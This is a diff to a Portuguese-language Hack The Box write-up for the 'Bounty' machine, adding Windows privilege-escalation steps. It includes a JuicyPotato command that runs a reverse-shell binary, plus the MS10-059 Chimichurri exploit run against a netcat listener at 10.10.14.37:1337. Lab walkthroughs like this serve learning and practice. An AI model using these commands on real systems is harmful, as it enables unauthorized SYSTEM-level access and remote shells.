@@ -2797,10 +2797,32 @@ done
 
 ## GET SYSTEM
 
-## JuicyPotato
+### JuicyPotato
 
 Conforme o que tinhamos enumerado no inicio, entao rapidamente usando JuicyPotato consigo escalar .
 
 `SeImpersonatePrivilege` estava habilitado
 
+CLSID
+
+https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
+
+`.\JuicyPotato.exe -l 1337 -p c:\windows\temp\reverse64.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}`
+
 ![13.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bounty/13.jpg)
+
+
+### MS10-059
+
+https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled
+
+Configure seu listen na porta desejada
+
+`rlwrap nc -nlvp 1337`
+
+e execute
+
+`c:\Windows\Temp>.\Chimichurri.exe 10.10.14.37 1337`
+
+![14.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bounty/14.jpg)
+
